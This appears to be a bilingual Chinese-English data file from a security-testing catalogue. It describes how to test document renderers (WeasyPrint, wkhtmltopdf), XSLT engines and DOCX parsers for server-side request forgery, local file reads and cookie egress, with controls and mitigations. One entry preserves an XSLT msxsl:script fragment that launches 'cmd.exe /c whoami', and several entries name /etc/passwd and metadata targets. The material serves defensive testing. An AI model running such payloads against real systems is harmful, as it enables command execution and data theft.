overview.en: All three DOM APIs can produce browser-side requests, with different transport locations and navigation side effects. They are data egress after script execution, not SSRF caused by a server fetching a supplied URL.

vulnerability.zh: 当不可信 HTML 在带业务 Cookie 的渲染上下文运行，非 HttpOnly 值可被脚本读取并发送。捕获器只收到空请求、固定 URL 或浏览器预检并不能证明 Cookie 泄露。
vulnerability.en: When untrusted HTML runs in a rendering context carrying business cookies, non-HttpOnly values can be read and sent by script. An empty request, fixed URL, or browser preflight at the collector does not prove cookie disclosure.

exploitation.zh: 为每个 API 设置不同随机 Cookie 和捕获路径，逐条渲染并比较 HttpOnly 对照。阳性要求捕获器收到当前任务的非 HttpOnly 值，且 HttpOnly 值始终缺失。
exploitation.en: Assign a distinct random cookie and collector path to each API, render one at a time, and compare the HttpOnly control. A positive requires the current job's non-HttpOnly value at the collector while the HttpOnly value remains absent.

mitigation.zh: 在独立无会话来源中渲染，禁用不需要的 JavaScript，应用严格 CSP 与出口允许列表，并把敏感 Cookie 设置 HttpOnly、Secure 和适当 SameSite。
mitigation.en: Render in an isolated sessionless origin, disable unnecessary JavaScript, apply strict CSP and egress allowlisting, and mark sensitive cookies HttpOnly, Secure, and with an appropriate SameSite policy.

title.zh: 建立测试 Cookie 对照

description.zh: 创建随机普通 Cookie 与随机 HttpOnly Cookie，并确认正常页面无出站。
description.en: Create random ordinary and HttpOnly cookies and confirm an ordinary page has no egress.

title.zh: 逐通道提交页面
title.en: Submit one channel at a time

description.zh: 为三种 API 分配不同捕获路径并分别渲染一次。
description.en: Assign separate collector paths to the three APIs and render each once.

title.zh: 关联 Cookie 与任务

description.zh: 匹配随机值、请求时间、浏览器进程和渲染 ID，验证 HttpOnly 缺失。
description.en: Match random value, request time, browser process, and render ID and verify the HttpOnly value is absent.

title.zh: 隔离会话后回归

description.zh: 修复后确认三种通道均不能携带测试 Cookie，同时普通渲染保持正常。
description.en: After remediation confirm none of the channels carries the test cookie while ordinary rendering remains functional.

analysis.zh: 捕获器收到与当前任务绑定的随机非 HttpOnly Cookie 才证明数据出站。仅产生请求、改变 location、加载失败或收到无 Cookie 流量是阴性；HttpOnly 对照用于限定脚本可读边界。
analysis.en: Data egress is proven only when the collector receives the random non-HttpOnly cookie bound to the current job. A request alone, location change, load failure, or cookie-free traffic is negative; the HttpOnly control bounds script readability.

opsecTips.zh: 捕获器只保存随机值和任务 ID，禁止真实会话 Cookie、请求体转储和重定向
opsecTips.en: The collector stores only the random value and job ID, with no real session cookies, body dumps, or redirects.

opsecTips.zh: 每次运行使用全新 Profile 和 Cookie jar，捕获首个请求后立即关闭网络与浏览器
opsecTips.en: Use a fresh profile and cookie jar for every run and close networking and the browser after the first captured request.

name.zh: WeasyPrint HTTP 子资源获取边界

description.zh: 归并外部样式表和 SVG image 两种声明式 HTTP 子资源，验证 WeasyPrint URL fetcher 是否可达渲染服务内部地址。
description.en: Groups external stylesheet and SVG image declarative HTTP subresources to test whether the WeasyPrint URL fetcher can reach renderer-internal destinations.

subCategory.zh: 文档渲染 HTTP 子资源

prerequisites.zh: 127.0.0.1 在渲染前改为隔离的 marker 服务，且无真实内部路由
prerequisites.en: 127.0.0.1 is replaced before rendering with an isolated marker service and no real internal route is available.

prerequisites.zh: 能够记录 WeasyPrint 版本、自定义 URL fetcher 决策和模拟端点首包
prerequisites.en: The WeasyPrint version, custom URL-fetcher decisions, and simulator first packets can be recorded.

title.zh: CSS 与 SVG HTTP 子资源

description.zh: 实际渲染将地址替换为两个带独立令牌的模拟路径，响应仅为最小有效 CSS 或图片。
description.en: During rendering replace the address with two separately tokenized simulator paths returning only minimal valid CSS or image content.

overview.zh: WeasyPrint 会通过 URL fetcher 解析 HTML/CSS/SVG 引用。link 和 image 是同一服务端取资源边界的不同格式入口。
overview.en: WeasyPrint resolves HTML, CSS, and SVG references through its URL fetcher. link and image are format-specific entries into the same server-side resource-fetch boundary.

vulnerability.zh: 若攻击者可控制资源 URL 且 fetcher 未限制解析后的地址，渲染进程可能访问内部 HTTP 服务。输出中仅出现 URL、资源渲染失败或 DNS 查询并不证明请求到达。
vulnerability.en: If an attacker controls resource URLs and the fetcher does not restrict resolved destinations, the renderer may access internal HTTP services. A URL in output, failed resource rendering, or DNS lookup alone does not prove the request arrived.

exploitation.zh: 先渲染无外部资源基线，再分别提交 CSS 和 SVG 变体到不同 marker 路径。阳性要求模拟端点首包与对应渲染任务关联；是否呈现资源作为第二层证据。
exploitation.en: Render a no-external-resource baseline, then submit CSS and SVG variants to separate marker paths. A positive correlates the simulator first packet with the render job; visible resource rendering is a second evidence layer.

mitigation.zh: 用自定义 URL fetcher 仅允许批准 scheme、域名和解析地址，在重定向后重复校验；渲染容器网络默认拒绝内部及链路本地路由。
mitigation.en: Use a custom URL fetcher that permits only approved schemes, hosts, and resolved addresses and revalidates after redirects; deny internal and link-local routes by default in the rendering container.

title.zh: 记录 Fetcher 基线

description.zh: 保存版本、允许 scheme 和无资源文档的零请求结果。
description.en: Preserve the version, allowed schemes, and zero-request result for a resource-free document.

title.zh: 逐资源渲染 Marker

description.zh: 为 CSS 与 SVG 分配不同令牌并分别生成文档。
description.en: Assign separate tokens to CSS and SVG and generate each document separately.

title.zh: 关联服务端请求

description.zh: 匹配渲染 ID、首包、User-Agent 和令牌，排除浏览器客户端流量。
description.en: Match render ID, first packet, user agent, and token and exclude client-browser traffic.

title.zh: 限制 Fetcher 后回归

description.zh: 确认批准 CDN 资源可用，模拟内部地址在连接前失败。
description.en: Confirm approved CDN resources remain available and the simulated internal address fails before connection.

analysis.zh: 来自 WeasyPrint 进程并携带当前 marker 的 HTTP 首包证明服务端资源访问。渲染警告、空白图片、DNS 或客户端查看 PDF 时的请求都不是同等证据。
analysis.en: An HTTP first packet from the WeasyPrint process carrying the current marker proves server-side resource access. Render warnings, blank images, DNS, or requests made while viewing the PDF are not equivalent evidence.

opsecTips.zh: 模拟服务无重定向、无认证并在首个请求后关闭，不返回任何内部数据
opsecTips.en: The simulator has no redirects or authentication, closes after its first request, and returns no internal data.

opsecTips.zh: 渲染容器使用一次性网络命名空间、短超时和严格响应体大小上限
opsecTips.en: Use a disposable network namespace, short timeout, and strict response-size cap for the rendering container.

name.zh: WeasyPrint File URI 子资源边界

description.zh: 归并样式表与 SVG image 的 file URI 变体，验证 WeasyPrint URL fetcher 和渲染身份对本地文件的访问范围。
description.en: Groups stylesheet and SVG image file-URI variants to test the local-file reach of the WeasyPrint URL fetcher and rendering identity.

subCategory.zh: 文档渲染本地文件访问

prerequisites.zh: 原系统路径替换为渲染沙箱中分别包含最小 CSS 和图片的临时 marker 文件
prerequisites.en: The original system path is replaced with temporary marker files containing minimal CSS and image data inside the rendering sandbox.

prerequisites.zh: 渲染身份无宿主挂载权限，文件审计覆盖 URL fetcher 的 open/read 事件
prerequisites.en: The rendering identity has no host-mount permission and file audit covers URL-fetcher open and read events.

title.zh: CSS 与 SVG File URI

description.zh: 执行前将两条路径分别改为最小 marker.css 和 marker.png，禁止读取 `/etc/passwd`。
description.en: Before execution change the two paths to minimal marker.css and marker.png respectively; do not read /etc/passwd.

overview.zh: WeasyPrint 默认取资源机制可能处理 file URI，而能否读到内容取决于 fetcher 定制、base URL 和操作系统权限。CSS 与 SVG 只是内容类型不同。
overview.en: WeasyPrint resource retrieval may handle file URIs, while successful content reads depend on fetcher customization, base URL, and operating-system permissions. CSS and SVG differ only by content type here.

vulnerability.zh: 不可信文档若能引用渲染主机文件，可能通过呈现结果或错误侧信道暴露内容。路径被接受、文件存在或格式解析错误不等于内容已泄露。
vulnerability.en: If an untrusted document can reference renderer-host files, content may leak through rendered output or an error side channel. Path acceptance, file existence, or a format error does not equal content disclosure.

exploitation.zh: 使用不存在文件、有效 marker.css 与 marker.png 做对照，逐条渲染并关联 open/read 和输出变化。只在 marker 内容影响文档且读取事件匹配时记录内容读取。
exploitation.en: Use a missing file, valid marker.css, and marker.png as controls, render one at a time, and correlate open/read events with output changes. Record a content read only when marker data affects the document and the read event matches.

mitigation.zh: 自定义 fetcher 拒绝 file scheme 或仅允许规范化后的专用资源根目录，同时以无宿主挂载的低权限容器运行渲染器。
mitigation.en: Reject the file scheme in a custom fetcher or allow only a canonical dedicated asset root, and run the renderer in a low-privilege container without host mounts.

title.zh: 准备类型正确的 Marker

description.zh: 创建最小 CSS 与图片文件并记录哈希，另设不存在路径。
description.en: Create minimal CSS and image files, record their hashes, and define a missing path.

title.zh: 改写 URI 后逐条渲染

description.zh: 每次只引用一种 marker，保存文件审计和输出哈希。
description.en: Reference one marker type per run and preserve file audit and output hash.

title.zh: 确认读取而非存在性

description.zh: 要求读取字节和文档效果同时出现，并与缺失文件对照。
description.en: Require both bytes read and document effect and compare with the missing-file control.

title.zh: 限制资源根并清理
title.en: Restrict the asset root and clean up

description.zh: 修复后保留批准资产，拒绝目录外 marker，再删除临时文件。
description.en: After remediation preserve approved assets, reject the out-of-root marker, and delete temporary files.

analysis.zh: 阳性需要 WeasyPrint 进程读取临时 marker 并在输出中产生可解释效果。URI 被解析、文件 open 失败或解析器报告格式错误只能证明到达某层边界。
analysis.en: A positive requires the WeasyPrint process to read the temporary marker and produce an attributable output effect. URI parsing, a failed file open, or a format error proves only that a particular boundary was reached.

opsecTips.zh: 只挂载自动生成的 marker 目录，绝不暴露 `/etc`、用户目录、密钥或应用配置
opsecTips.en: Mount only the generated marker directory and never expose /etc, user directories, keys, or application configuration.

opsecTips.zh: 限制单次读取大小和文件数量，渲染完成后卸载目录并销毁输出
opsecTips.en: Limit bytes and file count per run, then unmount the directory and destroy output after rendering.

name.zh: wkhtmltopdf 脚本化 HTTP Iframe

description.zh: 验证 wkhtmltopdf 在启用 JavaScript 时是否执行 document.write 并由动态 iframe 发起服务端 HTTP 子资源请求。
description.en: Tests whether wkhtmltopdf executes document.write when JavaScript is enabled and makes a server-side HTTP subresource request from the dynamic iframe.

subCategory.zh: 脚本化渲染器网络访问

prerequisites.zh: 回环地址在执行前替换为隔离 marker 服务，渲染主机无内部或云元数据路由
prerequisites.en: The loopback address is replaced before execution with an isolated marker service and the renderer has no internal or cloud-metadata routes.

prerequisites.zh: 已记录 wkhtmltopdf 版本、JavaScript 开关、延迟设置和子资源网络日志
prerequisites.en: wkhtmltopdf version, JavaScript setting, delay configuration, and subresource network logs are recorded.

title.zh: 动态 HTTP Iframe

description.zh: 把目标改为无重定向的 marker 端点，只渲染一次并记录脚本执行与 iframe 请求。
description.en: Replace the target with a nonredirecting marker endpoint, render once, and record script execution and the iframe request.

overview.zh: 该输入包含两个连续条件：JavaScript 必须运行，随后动态插入的 iframe 才可能由渲染器取回。它与静态资源引用需要分开归因。
overview.en: This input has two sequential conditions: JavaScript must run before the dynamically inserted iframe can be fetched by the renderer. Attribution therefore differs from static resource references.

vulnerability.zh: 若不可信 HTML 可执行脚本并访问内部 HTTP 目标，渲染服务可能形成 SSRF。仅看到脚本标签、DOM 中有 iframe 或渲染超时不足以证明网络请求。
vulnerability.en: If untrusted HTML can execute script and access internal HTTP destinations, the rendering service may provide SSRF. A script tag, iframe in the DOM, or render timeout alone does not prove a network request.

exploitation.zh: 先用禁用 JavaScript 的同一输入建立阴性，再启用脚本并指向一次性 marker。阳性要求脚本执行日志、动态节点和来自渲染进程的 marker 请求按时间关联。
exploitation.en: Use the same input with JavaScript disabled as a negative control, then enable script and target a one-time marker. A positive temporally correlates script execution, dynamic node creation, and the marker request from the renderer process.

mitigation.zh: 默认禁用 JavaScript；确需脚本时在独立无内部路由容器中运行，并对所有初始和动态资源执行解析后地址允许列表。
mitigation.en: Disable JavaScript by default; when required, run it in a separate container without internal routes and enforce a post-resolution destination allowlist for initial and dynamic resources.

title.zh: 保存禁用脚本对照

description.zh: 确认同一 HTML 不创建 iframe 且不访问 marker。
description.en: Confirm the same HTML creates no iframe and does not access the marker.

title.zh: 启用脚本并渲染一次

description.zh: 替换目标后设置短延迟，保存进程和网络跟踪。
description.en: After replacing the target, use a short delay and preserve process and network traces.

title.zh: 关联动态请求

description.zh: 匹配 DOM 创建、请求令牌和渲染 PID，确认请求由 wkhtmltopdf 发出。
description.en: Match DOM creation, request token, and renderer PID and confirm wkhtmltopdf sent the request.

title.zh: 关闭脚本或出口后回归
title.en: Regress after disabling script or egress

description.zh: 确认业务静态文档仍可生成而动态内部目标不再访问。
description.en: Confirm business static documents still generate while the dynamic internal destination is no longer accessed.

analysis.zh: 完整阳性必须证明 wkhtmltopdf 执行脚本、创建 iframe 并发出带 marker 的 HTTP 请求。任何单一中间信号都不足以把结果定为脚本化 SSRF。
analysis.en: A complete positive proves wkhtmltopdf executed script, created the iframe, and sent the marker-bearing HTTP request. No single intermediate signal is sufficient to classify scripted SSRF.

opsecTips.zh: marker 服务仅记录首包后关闭，禁用重定向、认证和二次引用
opsecTips.en: The marker service records one first packet and closes, with redirects, authentication, and secondary references disabled.

opsecTips.zh: 使用一次性工作目录和短 JavaScript 延迟，任务结束即终止所有子进程
opsecTips.en: Use a disposable working directory and short JavaScript delay and terminate every child process when the job ends.

name.zh: wkhtmltopdf 脚本化 File Iframe

description.zh: 验证 wkhtmltopdf 执行脚本后动态 iframe 是否能打开渲染沙箱中的 file URI。
description.en: Tests whether a dynamic iframe can open a file URI inside the rendering sandbox after wkhtmltopdf executes script.

subCategory.zh: 脚本化渲染器本地文件访问

prerequisites.zh: 原系统路径改为只含随机文本的沙箱 marker 文件，且工作目录外文件不可见
prerequisites.en: The original system path is changed to a random-text sandbox marker file and files outside the working directory are invisible.

prerequisites.zh: 文件审计和 JavaScript 对照可区分动态节点创建、打开尝试和实际读取
prerequisites.en: File audit and JavaScript controls distinguish dynamic-node creation, open attempts, and actual reads.

title.zh: 动态 File Iframe

description.zh: 执行前只把 URI 改为临时 marker.txt，绝不访问 `/etc/passwd` 或其他宿主文件。
description.en: Before execution change the URI only to temporary marker.txt and never access /etc/passwd or another host file.

overview.zh: 脚本先动态写入 iframe，随后 Qt WebKit 的本地文件策略决定是否打开目标。需要把脚本能力和文件读取结果分层记录。
overview.en: Script first writes an iframe, after which Qt WebKit local-file policy determines whether the target opens. Script capability and file-read outcome must be recorded as separate layers.

vulnerability.zh: 若不可信脚本能引用宿主 file URI 且本地文件访问被放宽，渲染结果可能包含文件内容。DOM 中出现 URI、文件存在性或加载错误都不是内容泄露证据。
vulnerability.en: If untrusted script can reference a host file URI and local-file access is relaxed, rendered output may contain file content. A URI in the DOM, file-existence signal, or load error is not evidence of content disclosure.

exploitation.zh: 用禁用脚本、缺失 marker 和有效 marker 三组对照，关联动态 iframe、文件 read 事件与输出中的随机值。只有三者闭环才记为可读。
exploitation.en: Use script-disabled, missing-marker, and valid-marker controls and correlate the dynamic iframe, file-read event, and random value in output. Record readability only when all three form a closed evidence chain.

mitigation.zh: 禁用 JavaScript 和本地文件访问；必须加载本地资产时只暴露规范化资源根，并以无宿主挂载权限身份运行。
mitigation.en: Disable JavaScript and local-file access; when local assets are required, expose only a canonical asset root and run without host-mount permissions.

title.zh: 准备文件与脚本对照

description.zh: 创建随机 marker 和缺失路径，并记录禁用 JavaScript 的零读取结果。
description.en: Create a random marker and missing path and record a zero-read result with JavaScript disabled.

title.zh: 改写 URI 后渲染

description.zh: 只运行一次动态 iframe，保存文件审计与输出哈希。
description.en: Run the dynamic iframe once and preserve file audit and output hash.

title.zh: 确认 Marker 内容读取

description.zh: 匹配 wkhtmltopdf PID 的 read 和输出随机值，排除仅 open 或错误。
description.en: Match the wkhtmltopdf PID's read with the random output value and exclude open-only events or errors.

title.zh: 撤销权限并销毁资产

description.zh: 修复后 marker 在打开前失败，再删除临时目录、Profile 和 PDF。
description.en: After remediation make the marker fail before open, then delete the temporary directory, profile, and PDF.

analysis.zh: 只有渲染进程读取 marker 字节并使随机值进入输出，才证明本地文件内容可达。脚本执行本身或 iframe 创建只说明到达前置条件。
analysis.en: Local-file content is reachable only when the renderer reads marker bytes and the random value enters output. Script execution or iframe creation alone establishes only prerequisites.

opsecTips.zh: 只创建无敏感单行 marker，容器内不挂载系统目录、用户目录或应用密钥
opsecTips.en: Create only a nonsensitive one-line marker and mount no system directories, user directories, or application keys in the container.

opsecTips.zh: 文件读取限制为单文件和极小字节数，首次 read 后立即终止渲染
opsecTips.en: Limit file access to one file and very few bytes and terminate rendering immediately after the first read.

name.zh: wkhtmltopdf 静态 HTTP 子资源集合

description.zh: 归并 img、link、object、embed、video、audio、source 和 track 标签的静态 HTTP 引用，验证各解析器入口是否共享服务端地址限制。
description.en: Groups static HTTP references across img, link, object, embed, video, audio, source, and track tags to test whether their parser paths share server-side destination controls.

subCategory.zh: 静态渲染器子资源访问

prerequisites.zh: 所有回环和元数据目标改为隔离服务上的独立 token 路径，禁止真实特殊地址访问
prerequisites.en: All loopback and metadata targets are changed to independently tokenized paths on an isolated service, with real special-address access prohibited.

prerequisites.zh: 模拟服务能返回每种标签所需的最小 MIME，并记录来自渲染 PID 的首包
prerequisites.en: The simulator can return minimal MIME-appropriate data for each tag and record the first packet from the renderer PID.

title.zh: 静态 HTTP 资源标签

description.zh: 逐行将地址替换为对应 token/MIME 的模拟端点并单独渲染，绝不连接真实元数据或回环服务。
description.en: For each line replace the address with its tokenized MIME-appropriate simulator endpoint and render separately; never connect to real metadata or loopback services.

overview.zh: 不同 HTML 标签由 Qt WebKit 的不同加载路径处理，资源类型支持程度也不同。将它们保留为一个静态资源矩阵便于比较，而不与 JavaScript 动态行为混合。
overview.en: Different HTML tags traverse different Qt WebKit loading paths and resource-type support varies. Keeping them as one static-resource matrix enables comparison without mixing in dynamic JavaScript behavior.

vulnerability.zh: 任一受攻击者控制的静态资源若能访问渲染环境内部 HTTP 服务，都构成服务端请求能力。某标签不受支持、资源显示为空或 MIME 错误不能代表其他标签安全。
vulnerability.en: Any attacker-controlled static resource that reaches an HTTP service internal to the rendering environment provides a server-side request capability. An unsupported tag, blank rendering, or MIME error does not establish safety for other tags.

exploitation.zh: 为每种标签分配唯一 token 和最小响应，按固定顺序单独渲染。阳性按标签记录来自渲染进程的请求；内容是否进入 PDF 另行分级，不能由请求自动推导。
exploitation.en: Assign every tag a unique token and minimal response and render individually in fixed order. Record renderer-origin requests by tag; grade whether content reaches the PDF separately rather than inferring it from a request.

mitigation.zh: 在统一资源加载层执行 scheme、DNS 与解析 IP 允许列表并复查重定向，同时通过容器防火墙阻断私网、回环和链路本地目标。
mitigation.en: Enforce scheme, DNS, and resolved-IP allowlisting in a unified resource loader and recheck redirects, while container firewalling blocks private, loopback, and link-local destinations.

title.zh: 构建标签 Token 矩阵

description.zh: 为九种标签准备独立路径、MIME 和预期加载结果。
description.en: Prepare a separate path, MIME, and expected load result for all nine tags.

title.zh: 按固定顺序逐条渲染

description.zh: 每次仅保留一个资源引用并保存渲染与网络日志。
description.en: Keep one resource reference per run and preserve render and network logs.

title.zh: 按标签记录请求能力

description.zh: 匹配 PID、token 和首包，不把 MIME 失败误记为无请求。
description.en: Match PID, token, and first packet and do not mistake MIME failure for absence of a request.

title.zh: 统一阻断后回归矩阵
title.en: Regress the matrix after unified blocking

description.zh: 确认所有模拟内部目标被拒绝，而批准资源类型仍能加载。
description.en: Confirm all simulated internal destinations are rejected while approved resource types continue loading.

analysis.zh: 每个 token 的渲染器源首包分别证明对应标签可发起服务端请求；响应被下载不等于内容可读或可回传。未支持标签是该路径阴性，不能覆盖其他加载器。
analysis.en: A renderer-origin first packet for each token proves that tag can make a server-side request; downloading a response does not imply readable or exfiltratable content. An unsupported tag is negative for that path only and does not cover other loaders.

opsecTips.zh: 每个模拟路径只接受一次请求并返回极小静态体，不提供重定向、压缩炸弹或主动内容
opsecTips.en: Each simulator path accepts one request and returns a tiny static body with no redirects, compression bombs, or active content.

opsecTips.zh: 逐标签使用新工作目录和短超时，防止媒体加载器重试造成额外流量
opsecTips.en: Use a fresh working directory and short timeout for each tag to prevent media-loader retries from creating extra traffic.

name.zh: wkhtmltopdf 静态 File 图片资源

description.zh: 验证静态 img 的 file URI 是否能由 wkhtmltopdf 打开渲染沙箱内的本地图片，并与脚本化文件 iframe 分离。
description.en: Tests whether wkhtmltopdf can open a sandbox-local image through a static img file URI, separate from the scripted file-iframe path.

prerequisites.zh: 原 `/etc/passwd` 替换为渲染沙箱内带可见随机标记的最小图片
prerequisites.en: The original /etc/passwd path is replaced with a minimal image carrying a visible random marker inside the rendering sandbox.

prerequisites.zh: 已冻结本地文件访问开关和 base URL，文件审计覆盖 wkhtmltopdf 进程
prerequisites.en: Local-file access settings and base URL are frozen and file audit covers the wkhtmltopdf process.

title.zh: 静态 File 图片

description.zh: 实际渲染只指向临时 marker.png；原路径仅用于来源追踪，不读取系统文件。
description.en: During rendering point only to temporary marker.png; the original path is retained for provenance and no system file is read.

overview.zh: 静态 img 可在无需 JavaScript 的情况下触发本地资源加载，行为取决于 wkhtmltopdf 版本、本地访问开关和文件权限。
overview.en: A static img can trigger local resource loading without JavaScript, depending on wkhtmltopdf version, local-access settings, and filesystem permissions.

vulnerability.zh: 若不可信 HTML 可指向渲染主机文件，格式可解析的内容可能进入 PDF。路径接受、open 尝试或破图图标不证明文件内容已经读出。
vulnerability.en: If untrusted HTML can target renderer-host files, parseable content may enter the PDF. Path acceptance, an open attempt, or a broken-image icon does not prove file content was read.

exploitation.zh: 用缺失文件与随机 marker 图片对照，关联文件读取、图片解码和 PDF 中标记。只有渲染进程读取且输出包含标记时定为内容可达。
exploitation.en: Compare a missing file with a random marker image and correlate file read, image decode, and the marker in the PDF. Content is reachable only when the renderer reads it and output contains the marker.

mitigation.zh: 禁用本地文件访问或只允许规范化资源根；渲染容器仅挂载批准资产，并拒绝输入中的 file scheme 和路径逃逸。
mitigation.en: Disable local-file access or allow only a canonical asset root; mount approved assets only in the render container and reject the file scheme and path escapes in input.

title.zh: 创建 Marker 图片对照

description.zh: 生成微型随机图片、缺失路径和普通内联图片基线。
description.en: Generate a tiny random image, a missing path, and an ordinary inline-image baseline.

title.zh: 改写 File URI 并渲染
title.en: Rewrite the file URI and render

description.zh: 只运行一次并保存文件、解码和输出证据。
description.en: Run once and preserve file, decode, and output evidence.

title.zh: 验证输出中的标记

description.zh: 匹配 read 事件和 PDF 像素/对象，排除仅存在性。
description.en: Match the read event with PDF pixels or objects and exclude existence-only signals.

title.zh: 限制资源根并回归
title.en: Restrict the asset root and regress

description.zh: 修复后批准图片仍加载，根目录外 marker 在打开前失败。
description.en: After remediation approved images still load and the out-of-root marker fails before open.

analysis.zh: 文件 read 和 PDF 中随机图像标记的组合证明静态本地资源可达。若只出现 URI、权限错误或破图占位，则没有文件内容泄露证据。
analysis.en: The combination of a file read and the random image marker in the PDF proves static local-resource reach. A URI, permission error, or broken-image placeholder alone is not evidence of file-content disclosure.

opsecTips.zh: 只挂载 marker 图片目录，禁止系统路径、符号链接和宿主卷进入渲染容器
opsecTips.en: Mount only the marker-image directory and prohibit system paths, symlinks, and host volumes in the render container.

opsecTips.zh: 限制图片尺寸、解码内存和文件数，验证后删除图片、PDF 与工作目录
opsecTips.en: Limit image dimensions, decode memory, and file count, then delete the image, PDF, and working directory after validation.

name.zh: XSLT msxsl:script 代码扩展片段

description.zh: 保留不可单独解析但内部连贯的 msxsl:script C# 与 user:exec() 片段，用于验证宿主 XSLT 引擎是否启用脚本扩展；实际测试必须嵌入有效样式表并改用无副作用标记函数。
description.en: Preserves the non-standalone but internally coherent msxsl:script C# and user:exec() fragment to test whether a host XSLT engine enables script extensions; validation must embed it in a valid stylesheet and replace the process call with a side-effect-free marker function.

prerequisites.zh: 明确目标 .NET/XSLT 实现、版本与 EnableScript 设置，并保存禁用脚本的解析基线
prerequisites.en: The target .NET/XSLT implementation, version, and EnableScript setting are known and a script-disabled parse baseline is preserved.

prerequisites.zh: 原 Process.Start 块在执行前替换为只返回随机常量的受控 C# 函数，且补齐 template 与 stylesheet 闭合标签
prerequisites.en: Before execution the original Process.Start block is replaced with a controlled C# function that only returns a random constant, and valid template and stylesheet closing tags are added.

title.zh: msxsl C# 扩展原始片段

execution.command:
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
  <msxsl:script language="C#" implements-prefix="user">
    public string exec() {
      System.Diagnostics.Process p = System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "";
  </msxsl:script>
    <xsl:value-of select="user:exec()"/>

description.zh: 该命令按来源原样保留且不是完整 XML；不要直接执行。构造验证样式表时删除进程启动语句，改为返回一次性 marker。
description.en: This command is preserved byte-for-byte from the source and is not complete XML; do not execute it directly. When constructing a validation stylesheet, remove process launch and return a one-time marker instead.

overview.zh: `msxsl:script` 可在支持的 .NET XSLT 引擎中编译脚本并通过命名空间函数调用。原七行缺少模板和闭合根元素，但 script 声明与调用属于不可拆开的同一结构。
overview.en: msxsl:script can compile script in supported .NET XSLT engines and expose it through a namespace function. The seven source lines lack a template and root closing element, but the script declaration and invocation form one inseparable structure.

vulnerability.zh: 若应用让不可信样式表进入启用脚本的转换器，脚本扩展可越过纯数据转换边界。样式表可解析、脚本被编译或错误中出现 Process 均不等于函数执行。
vulnerability.en: If an application passes untrusted stylesheets to a transformer with scripting enabled, script extensions can cross the pure-data transformation boundary. Parse success, script compilation, or Process in an error does not equal function execution.

exploitation.zh: 先把片段补成合法 stylesheet/template，并将函数改为返回随机 marker；分别在 EnableScript=false/true 下转换固定 XML。阳性要求启用时输出 marker，禁用时在调用前拒绝。
exploitation.en: Complete the fragment into a valid stylesheet and template and change the function to return a random marker; transform fixed XML with EnableScript false and true. A positive emits the marker only when enabled and rejects the call before execution when disabled.

mitigation.zh: 禁止用户提供 XSLT，或使用禁用脚本和 document() 的固定受信样式表；隔离转换身份并限制文件、进程和网络权限。
mitigation.en: Do not accept user-supplied XSLT, or use fixed trusted stylesheets with script and document() disabled; isolate the transformer identity and restrict file, process, and network permissions.

title.zh: 修复结构并建立禁用基线
title.en: Complete structure and establish a disabled baseline

description.zh: 只补齐必需 XSLT 结构，把原进程代码替换为常量 marker 函数。
description.en: Add only required XSLT structure and replace the source process code with a constant marker function.

title.zh: 在两种脚本设置下转换

description.zh: 使用同一固定 XML，记录编译、调用和输出差异。
description.en: Use the same fixed XML and record compilation, invocation, and output differences.

title.zh: 关联命名空间函数与 Marker
title.en: Correlate the namespace function and marker

description.zh: 确认输出来自 user:exec() 的受控返回，而非输入回显。
description.en: Confirm output comes from the controlled user:exec() return rather than input reflection.

title.zh: 禁用脚本并回归转换

description.zh: 修复后普通 XSLT 保持可用，脚本块在编译或调用前被拒绝。
description.en: After remediation preserve ordinary XSLT while rejecting script blocks before compilation or invocation.

analysis.zh: 这是一段必须整体保留的结构片段，不是七个独立 payload。有效阳性是补齐后的无副作用样式表仅在启用脚本时返回随机 marker；编译错误、namespace URL、select 属性或 Process 文本均不能证明执行。
analysis.en: This is one structural fragment that must remain intact, not seven independent payloads. A valid positive is a completed side-effect-free stylesheet returning a random marker only when scripting is enabled; compile errors, namespace URLs, the select attribute, or Process text do not prove execution.

opsecTips.zh: 绝不运行来源中的 cmd.exe/whoami；验证函数只能返回进程内随机常量且不得调用文件、网络或子进程 API
opsecTips.en: Never run the source cmd.exe/whoami call; the validation function may only return an in-process random constant and must not call file, network, or child-process APIs.

opsecTips.zh: 转换器使用低权限一次性进程、固定小 XML 和短超时，测试后删除编译缓存与输出
opsecTips.en: Use a low-privilege disposable transformer process, fixed small XML, and a short timeout, then delete compilation caches and output.

reason.zh: 该行只打开 stylesheet 且没有模板或闭合标签，无法作为 XML/XSLT 文档解析；其 PHP namespace 还与下一行 Java Runtime 表达式不匹配。
reason.en: This line only opens a stylesheet and has no template or closing tag, so it cannot parse as an XML/XSLT document; its PHP namespace also mismatches the following Java Runtime expression.

reason.zh: 该顶层 value-of 不位于 template 内，未声明可解析的 Runtime 扩展命名空间，且依赖未闭合的前一行；它不是可执行 XSLT。
reason.en: This top-level value-of is outside a template, declares no resolvable Runtime extension namespace, and depends on the preceding unclosed line; it is not executable XSLT.

reason.zh: 该行是未闭合 stylesheet 起始，且把非标准 file namespace 放在 EXSLT common 路径下；缺少模板、扩展声明实现和根闭合，不能独立执行。
reason.en: This line is an unclosed stylesheet start and places a nonstandard file namespace under the EXSLT common path; it lacks a template, extension implementation, and root closure and cannot execute independently.

reason.zh: 该顶层 value-of 位于任何 template 之外，file:write 也没有对应的标准 EXSLT common 实现；同时缺少完整 stylesheet，无法解析或写文件。
reason.en: This top-level value-of is outside any template and file:write has no corresponding standard EXSLT common implementation; the stylesheet is also incomplete, so it cannot parse or write a file.

name.zh: DOCX 外部通用实体资源解析

description.zh: 归并 file 与 HTTP SYSTEM 标识符变体，验证 word/document.xml 中外部通用实体是否由服务端展开。
description.en: Groups file and HTTP SYSTEM-identifier variants to test server-side expansion of external general entities in word/document.xml.

title.zh: DOCX 外部通用实体资源解析

description.zh: 原目标仅用于追溯；执行前改写为沙箱 marker 文件或隔离 HTTP marker，不访问列出的真实路径和元数据地址。
description.en: Targets are retained for provenance only; rewrite them to sandbox marker files or isolated HTTP markers and never access listed real paths or metadata addresses.

title.zh: 确认 DOCX 解析组件

description.zh: 记录处理器、任务入口和无外部资源基线。
description.en: Record the processor, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只使用本条执行区命令，所有真实目标替换为隔离 marker。
description.en: Use only this entry command and replace every real destination with an isolated marker.

title.zh: 关联解析证据

description.zh: 把 worker 事件、任务 token 与派生输出关联，排除客户端行为。
description.en: Correlate worker events, job token, and derived output and exclude client behavior.

title.zh: 关闭外部能力并回归

description.zh: 修复后普通 DOCX 保持可用，该机制在访问 marker 前被拒绝。
